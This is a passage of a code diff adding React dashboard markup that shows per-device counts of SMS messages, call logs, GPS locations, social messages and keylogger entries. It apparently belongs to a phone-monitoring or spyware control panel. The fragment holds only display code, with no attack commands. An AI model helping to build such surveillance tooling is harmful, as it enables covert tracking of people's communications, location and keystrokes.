+                          <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">SMS</span>
+                        </div>
+                        <div className="flex flex-col items-center">
+                          <span className="text-2xl font-black text-emerald-600 dark:text-emerald-400 tracking-tighter">{deviceStats.call_logs}</span>
+                          <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">Calls</span>
+                        </div>
+                        <div className="flex flex-col items-center">
+                          <span className="text-2xl font-black text-amber-600 dark:text-amber-400 tracking-tighter">{deviceStats.locations}</span>
+                          <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">Gps</span>
+                        </div>
+                        <div className="flex flex-col items-center">
+                          <span className="text-2xl font-black text-rose-600 dark:text-rose-400 tracking-tighter">{deviceStats.social_messages + deviceStats.keylogger_entries}</span>
+                          <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">Logs</span>
+                        </div>
+                      </div>
+                    ) : (
+                      <div className="text-center text-xs text-rose-500">Failed to load statistics</div>
+                    )}
+                  </div>
+                </div>
+
+                <div className="flex justify-between items-center text-xs text-slate-500 bg-slate-100 dark:bg-slate-900 rounded-lg p-3 font-medium">
+                  <span className="flex items-center gap-1.5"><ShieldAlert className="h-3.5 w-3.5" /> App v{infoDevice.app_version || "1.0.0"}</span>
+                  <span>Registered: {infoDevice.created_at ? format(parseISO(infoDevice.created_at), "MMM d, yyyy h:mm a") : "—"}</span>
+                </div>
+              </div>
+            </>
+          )}
         </DialogContent>
       </Dialog>
     </div>
